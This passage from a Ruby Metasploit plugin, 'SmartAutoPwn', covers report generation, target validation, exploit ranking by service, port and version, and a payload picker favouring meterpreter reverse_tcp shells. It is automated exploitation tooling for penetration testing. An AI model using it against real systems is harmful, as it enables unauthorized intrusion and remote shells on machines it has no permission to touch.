            _, ok    = run_cmd("wkhtmltopdf --quiet \"#{html_path}\" \"#{pdf_path}\"")
            if ok
              print_good("PDF  report : \e[36m#{pdf_path}\e[0m")
            else
              print_warning("PDF generation failed. Is wkhtmltopdf installed correctly?")
            end
          elsif !wkhtmltopdf_available?
            print_warning("PDF skipped: wkhtmltopdf not found (sudo apt install wkhtmltopdf)")
          elsif !html_path
            # generate HTML first for PDF conversion
            html_path = "#{base}.html"
            File.write(html_path, render_html_report(target, services, exploits))
            pdf_path  = "#{base}.pdf"
            run_cmd("wkhtmltopdf --quiet \"#{html_path}\" \"#{pdf_path}\"")
            print_good("PDF  report : \e[36m#{pdf_path}\e[0m")
          end
        end

        # ── JSON ─────────────────────────────────────────────────────
        if %w[json all].include?(format)
          json_path = "#{base}.json"
          json_data = build_json_report(target, services, exploits)
          File.write(json_path, JSON.pretty_generate(json_data))
          print_good("JSON report : \e[36m#{json_path}\e[0m")
        end

        print_line
        print_status("All reports saved under: #{outdir}/")
      end


      # ================================================================
      #   PRIVATE HELPERS
      # ================================================================
      private

      # ── Argument parsing ─────────────────────────────────────────────
      def parse_args(args)
        arr    = Array(args).flatten
        target = arr.shift.to_s.strip
        opts   = {}
        i      = 0
        while i < arr.size
          tok = arr[i]
          if tok.start_with?('--')
            key = tok.sub(/^--/, '')
            nxt = arr[i + 1]
            if nxt && !nxt.start_with?('--')
              opts[key] = nxt
              i += 2
            else
              opts[key] = true
              i += 1
            end
          else
            i += 1
          end
        end
        [target, opts]
      end

      # ── Validation ────────────────────────────────────────────────────
      def validate_target(target)
        if target.nil? || target.empty?
          print_error("No target specified!")
          print_status("  Usage: smart_scan <TARGET_IP>")
          return false
        end
        valid_ip   = target =~ /\A(\d{1,3}\.){3}\d{1,3}\z/
        valid_host = target =~ /\A[a-zA-Z0-9]([a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9])?\z/
        unless valid_ip || valid_host
          print_error("Invalid target format: #{target}")
          return false
        end
        true
      end

      # ── DB helpers ────────────────────────────────────────────────────
      def db_active?
        framework.db && framework.db.active
      rescue
        false
      end

      def get_services(target)
        return [] unless db_active?
        host = framework.db.get_host(address: target) rescue nil
        return [] unless host
        host.services.to_a.reject { |s| s.state == 'closed' rescue false }
      rescue
        []
      end

      def import_nmap_xml(xml_file)
        return unless File.exist?(xml_file) && db_active?
        framework.db.import_file(filename: xml_file)
        print_good("Imported to DB: #{xml_file}")
      rescue => e
        print_warning("DB import failed: #{e.message}")
      end

      # ── Command execution ─────────────────────────────────────────────
      def run_cmd(cmd)
        stdout, stderr, status = Open3.capture3(cmd)
        combined = (stdout.to_s + stderr.to_s)
        [combined, status.success?]
      rescue => e
        [e.message, false]
      end

      # ── Tool availability checks ──────────────────────────────────────
      def nmap_available?
        system('which nmap > /dev/null 2>&1')
      end

      def searchsploit_available?
        system('which searchsploit > /dev/null 2>&1')
      end

      def wkhtmltopdf_available?
        system('which wkhtmltopdf > /dev/null 2>&1')
      end

      # ── Output formatting helpers ─────────────────────────────────────
      def display_open_ports(nmap_output)
        nmap_output.each_line do |line|
          line.chomp!
          case line
          when /\d+\/(tcp|udp)\s+open/
            print_good("  #{line.strip}")
          when /^Nmap scan report|^Host is up|^Not shown|^PORT\s+STATE/
            print_status("  #{line.strip}")
          when /MAC Address:/
            print_status("  #{line.strip}")
          end
        end
      end

      def display_nse_vulns(output)
        vuln_section = false
        current_vuln = []

        output.each_line do |line|
          line.chomp!

          if line =~ /VULNERABLE|CVE-\d{4}|CRITICAL|HIGH|State:\s*VULNERABLE/i
            print_warning("  #{line.strip}")
            vuln_section = true
          elsif vuln_section && (line =~ /^\s{2,}/ || line =~ /IDs:|Risk|Description:|References/)
            print_line("    \e[31m#{line.strip}\e[0m")
          elsif vuln_section && line.strip.empty?
            vuln_section = false
          end
        end
      end

      # ── Service name resolution ───────────────────────────────────────
      def resolve_service_name(svc)
        name = (svc.name || '').downcase.strip
        return name unless name.empty?
        PORT_SERVICE_MAP[svc.port.to_i] || 'unknown'
      end

      # ── Search term builders ──────────────────────────────────────────
      def build_metasploit_search_terms(svc)
        svc_name = resolve_service_name(svc)
        info     = svc.info.to_s
        terms    = [svc_name]

        # Extract product names from banner/version string
        product_tokens = info.scan(/[A-Za-z][A-Za-z0-9_\-]{2,}/).reject do |t|
          %w[the and for with from not port].include?(t.downcase)
        end
        terms += product_tokens.first(3)

        # Well-known port → search term mapping
        extra = {
          21   => %w[vsftpd proftpd ftp],
          22   => %w[openssh ssh],
          23   => %w[telnet],
          25   => %w[exim sendmail smtp],
          80   => %w[apache nginx iis php http],
          139  => %w[samba netbios smb],
          443  => %w[apache nginx ssl https],
          445  => %w[ms17-010 eternalblue smb samba],
          1433 => %w[mssql microsoft sql],
          3306 => %w[mysql],
          3389 => %w[rdp bluekeep ms12-020],
          5432 => %w[postgresql postgres],
          5900 => %w[vnc realvnc],
          6379 => %w[redis],
          8080 => %w[tomcat http],
          27017=> %w[mongodb]
        }[svc.port.to_i] || []

        (terms + extra).flatten.uniq.compact.reject(&:empty?)
      end

      def build_searchsploit_terms(svc)
        info      = svc.info.to_s
        svc_name  = resolve_service_name(svc)
        terms     = [svc_name]

        # Try to extract "Product Version" pattern from banner
        if info =~ /(\w[\w\-\.]+)\s+([\d\.]+)/
          terms << "#{$1} #{$2}"
          terms << $1
        end

        terms << "#{svc_name} #{svc.port}" if svc_name != 'unknown'
        terms.flatten.uniq.compact
      end

      # ── AI exploit scoring ────────────────────────────────────────────
      def ai_score_exploit(mod_info, svc, term)
        svc_name    = resolve_service_name(svc)
        rank_score  = EXPLOIT_RANK_SCORES[mod_info['rank']] || 10
        fullname    = mod_info['fullname'].to_s.downcase
        description = mod_info['description'].to_s.downcase

        # Component scores (0–100 each)
        service_match = fullname.include?(svc_name) || description.include?(svc_name) ? 100 : 0
        port_match    = description.include?(svc.port.to_s) ? 100 : 0
        version_info  = svc.info.to_s.downcase
        ver_tokens    = version_info.scan(/\d+\.\d+[\.\d]*/)
        version_match = ver_tokens.any? { |v| description.include?(v) } ? 100 : 0
        # Recency: deeper module path = more specific = better
        recency       = [fullname.count('/') * 20, 100].min

        (
          rank_score  * AI_WEIGHTS[:rank_score]   +
          service_match * AI_WEIGHTS[:service_match] +
          port_match  * AI_WEIGHTS[:port_match]   +
          version_match * AI_WEIGHTS[:version_match] +
          recency     * AI_WEIGHTS[:recency_bonus]
        ).round
      end

      # ── Rank helpers ──────────────────────────────────────────────────
      def rank_name_to_score(name)
        map = {
          'excellent' => EXPLOIT_RANK_SCORES['ExcellentRanking'],
          'great'     => EXPLOIT_RANK_SCORES['GreatRanking'],
          'good'      => EXPLOIT_RANK_SCORES['GoodRanking'],
          'normal'    => EXPLOIT_RANK_SCORES['NormalRanking'],
          'average'   => EXPLOIT_RANK_SCORES['AverageRanking'],
          'low'       => EXPLOIT_RANK_SCORES['LowRanking'],
          'manual'    => EXPLOIT_RANK_SCORES['ManualRanking'],
          'any'       => 0
        }
        map[name] || 0
      end

      # ── Payload selection ─────────────────────────────────────────────
      def select_best_payload(mod)
        return nil unless mod.respond_to?(:compatible_payloads)
        available = mod.compatible_payloads.map { |p| p[0] } rescue []

        preferred_order = [
          'windows/x64/meterpreter/reverse_tcp',
          'windows/meterpreter/reverse_tcp',
          'linux/x86/meterpreter/reverse_tcp',
          'linux/x64/meterpreter/reverse_tcp',
          'java/meterpreter/reverse_tcp',
          'php/meterpreter/reverse_tcp',
          'python/meterpreter/reverse_tcp',
          'generic/shell_reverse_tcp'
        ]
        preferred_order.find { |p| available.include?(p) } || available.first
      end

      def options_valid?(mod)
        mod.options.each_pair do |name, opt|
          next unless opt.required
          return false if mod.datastore[name].nil? || mod.datastore[name].to_s.empty?
        end
        true
      rescue
        false
      end

      # ── Networking ────────────────────────────────────────────────────
      def get_local_ip
        Socket.ip_address_list.find { |a| a.ipv4? && !a.ipv4_loopback? }&.ip_address || '127.0.0.1'
      rescue
        '127.0.0.1'
      end

      # ── Utilities ─────────────────────────────────────────────────────
      def timestamp_tag
        Time.now.strftime('%Y%m%d_%H%M%S')
      end

      # ── JSON report builder ───────────────────────────────────────────
      def build_json_report(target, services, exploits)
        {
          meta: {
            tool:      'SmartAutoPwn v3.0',
            target:    target,
            generated: Time.now.iso8601,
            workspace: db_active? ? (framework.db.workspace.name rescue 'default') : 'none'
          },
          summary: {
            services_found:    services.size,
            exploits_found:    exploits.size,
            sessions_opened:   (framework.sessions.select { |_, s| s.target_host == target rescue false }.count rescue 0)
          },
          services: services.map { |s|
            { port: s.port, proto: s.proto, name: s.name, state: s.state, info: s.info }
          },
          cve_mappings: services.flat_map { |s|
            name = resolve_service_name(s)
            (CVE_MAP[name] || []).map { |c| { port: s.port, service: name, cve: c } }
          },
          top_exploits: exploits.first(20).map { |e|
            {
              module:   e[:module]['fullname'],
              rank:     e[:module]['rank'],
              ai_score: e[:ai_score],
              port:     e[:service].port,
              service:  e[:svc_name]
            }
          }
        }
      end

      # ── HTML report renderer ──────────────────────────────────────────
      def render_html_report(target, services, exploits)
        svc_rows = services.sort_by { |s| s.port.to_i }.map do |s|
          info_escaped = (s.info || '').gsub('<', '&lt;').gsub('>', '&gt;')
          "<tr>
             <td class='port'>#{s.port}/#{s.proto}</td>
             <td class='open'>OPEN</td>
             <td>#{s.name || 'unknown'}</td>
             <td class='version'>#{info_escaped}</td>
           </tr>"
        end.join("\n")

        exp_rows = exploits.first(25).map do |e|
          rank = (e[:module]['rank'] || 'unknown').sub('Ranking', '')
          rank_class = case e[:module]['rank']
            when 'ExcellentRanking', 'GreatRanking' then 'excellent'
            when 'GoodRanking'                       then 'good'
            else 'normal'
          end
          mod = e[:module]['fullname'].gsub('<', '&lt;')
          "<tr>
             <td><span class='badge #{rank_class}'>#{rank}</span></td>
             <td class='score'>#{e[:ai_score]}</td>
             <td class='port'>#{e[:service].port}</td>
             <td>#{e[:svc_name]}</td>
             <td class='module'>#{mod}</td>
           </tr>"
        end.join("\n")

        cve_rows = services.flat_map do |s|
          name = resolve_service_name(s)
          cves = CVE_MAP[name] || []
          cves.map do |c|
            cve_id = c.match(/CVE-\d{4}-\d+/)&.[](0) || 'N/A'
            "<tr>
               <td class='port'>#{s.port}/#{s.proto}</td>
               <td>#{name.upcase}</td>
               <td class='cve-id'>#{cve_id}</td>
               <td>#{c.gsub(cve_id,'').strip.sub(/^[–\-]\s*/,'')}</td>
             </tr>"
          end
        end.join("\n")

        sessions_count = framework.sessions.select { |_, s| s.target_host == target rescue false }.count rescue 0

        <<~HTML
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>SmartAutoPwn Report – #{target}</title>
            <style>
              :root {
                --bg:       #0d1117;
                --surface:  #161b22;
                --border:   #21262d;
                --blue:     #58a6ff;
                --orange:   #f0883e;
                --green:    #3fb950;
                --red:      #f85149;
                --yellow:   #e3b341;
                --muted:    #8b949e;
                --text:     #c9d1d9;
              }
              * { box-sizing: border-box; margin: 0; padding: 0; }
              body {
                background: var(--bg);
                color: var(--text);
                font-family: 'Segoe UI', 'Consolas', monospace;
                font-size: 14px;
                padding: 24px;
                line-height: 1.6;
              }
              .header {
                background: var(--surface);
                border: 1px solid var(--border);
                border-left: 4px solid var(--orange);
                border-radius: 8px;
                padding: 20px 24px;
                margin-bottom: 24px;
              }
              .header h1 {
                color: var(--orange);
                font-size: 1.5rem;
                margin-bottom: 6px;
              }
              .header .meta { color: var(--muted); font-size: 0.85rem; }
              .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
                gap: 12px;
                margin-bottom: 24px;
              }
              .stat-card {
                background: var(--surface);
                border: 1px solid var(--border);
                border-radius: 8px;
                padding: 16px;
                text-align: center;
              }
              .stat-card .number { font-size: 2rem; font-weight: bold; color: var(--blue); }
              .stat-card .label  { font-size: 0.75rem; color: var(--muted); margin-top: 4px; }
              h2 {
                color: var(--blue);
                font-size: 1.1rem;
                margin: 24px 0 12px;
                border-bottom: 1px solid var(--border);
                padding-bottom: 6px;
              }
              table {
                width: 100%;
                border-collapse: collapse;
                background: var(--surface);
                border-radius: 6px;
                overflow: hidden;
                margin-bottom: 16px;
              }
              th {
                background: #21262d;
                color: var(--blue);
                padding: 10px 14px;
                text-align: left;
                font-size: 0.82rem;
                text-transform: uppercase;
                letter-spacing: 0.05em;
              }
              td {
                padding: 8px 14px;
                border-bottom: 1px solid var(--border);
                font-size: 0.88rem;
              }
              tr:last-child td  { border-bottom: none; }
              tr:hover td       { background: rgba(88,166,255,0.04); }
              .port     { color: var(--yellow);  font-weight: bold; }
              .open     { color: var(--green);   font-weight: bold; }
              .version  { color: var(--muted); }
              .module   { color: var(--blue);  font-size: 0.82rem; }
              .score    { color: var(--orange); font-weight: bold; }
              .cve-id   { color: var(--red);   font-weight: bold; }
              .badge {
                display: inline-block;
                padding: 2px 8px;
                border-radius: 12px;
                font-size: 0.75rem;
                font-weight: bold;
              }
              .badge.excellent { background: #238636; color: #fff; }
              .badge.good      { background: #1f6feb; color: #fff; }
              .badge.normal    { background: #484f58; color: #c9d1d9; }
              .empty { color: var(--muted); font-style: italic; padding: 16px; text-align: center; }
              footer {
                margin-top: 40px;
                color: var(--muted);
                font-size: 0.78rem;
                text-align: center;
                border-top: 1px solid var(--border);
                padding-top: 16px;
              }
              @media print { body { background: white; color: black; } }
            </style>
          </head>
          <body>
            <div class="header">
              <h1>🔍 SmartAutoPwn Penetration Test Report</h1>
              <div class="meta">
                Target: <strong style="color:var(--yellow)">#{target}</strong> &nbsp;|&nbsp;
                Generated: #{Time.now.strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp;
                Tool: SmartAutoPwn v3.0
              </div>
            </div>

            <div class="stats-grid">
              <div class="stat-card">
                <div class="number">#{services.size}</div>
                <div class="label">Open Services</div>
              </div>
              <div class="stat-card">
                <div class="number" style="color:var(--red)">#{exploits.size}</div>
                <div class="label">Exploits Found</div>
              </div>
              <div class="stat-card">
                <div class="number" style="color:var(--orange)">#{services.flat_map { |s| CVE_MAP[resolve_service_name(s)] || [] }.size}</div>
                <div class="label">CVEs Mapped</div>
              </div>
              <div class="stat-card">
                <div class="number" style="color:var(--green)">#{sessions_count}</div>
                <div class="label">Sessions Opened</div>
              </div>
            </div>

            <h2>📡 Discovered Services</h2>
            <table>
              <thead><tr><th>Port/Proto</th><th>State</th><th>Service</th><th>Version / Banner</th></tr></thead>
              <tbody>
                #{svc_rows.empty? ? '<tr><td colspan="4" class="empty">No services found in database.</td></tr>' : svc_rows}
              </tbody>
            </table>

            <h2>⚔️ AI-Ranked Exploits (Top 25)</h2>
            <table>
              <thead><tr><th>MSF Rank</th><th>AI Score</th><th>Port</th><th>Service</th><th>Module</th></tr></thead>
              <tbody>
                #{exp_rows.empty? ? '<tr><td colspan="5" class="empty">No exploits found. Run smart_exploits first.</td></tr>' : exp_rows}
              </tbody>
            </table>

            <h2>🛡️ CVE Mappings</h2>
            <table>
              <thead><tr><th>Port/Proto</th><th>Service</th><th>CVE ID</th><th>Description</th></tr></thead>
              <tbody>
                #{cve_rows.empty? ? '<tr><td colspan="4" class="empty">No CVE mappings for discovered services.</td></tr>' : cve_rows}
              </tbody>
            </table>

            <footer>
              Generated by <strong>SmartAutoPwn v3.0</strong> Metasploit Plugin &nbsp;|&nbsp;
              For authorized penetration testing only. Unauthorized use is illegal.
            </footer>
          </body>
          </html>
        HTML
      end

    end  # ConsoleCommandDispatcher

    # ================================================================
    #  PLUGIN BOILERPLATE
    # ================================================================
    def initialize(framework, opts)
      super
      add_console_dispatcher(ConsoleCommandDispatcher)
      print_line
      print_good('SmartAutoPwn v3.0 plugin loaded successfully!')
      print_status('Commands: type  smart_help  for full command reference')
      print_status('Quick start: smart_scan <TARGET_IP>')
      print_line
    end

    def cleanup
      remove_console_dispatcher('SmartAutoPwn')
    end

    def name
      'SmartAutoPwn'
    end

    def desc
      'Intelligent automated port scan, CVE mapping, AI-ranked exploitation and reporting plugin for Metasploit'
    end
  end  # Plugin::SmartAutoPwn
end  # Msf
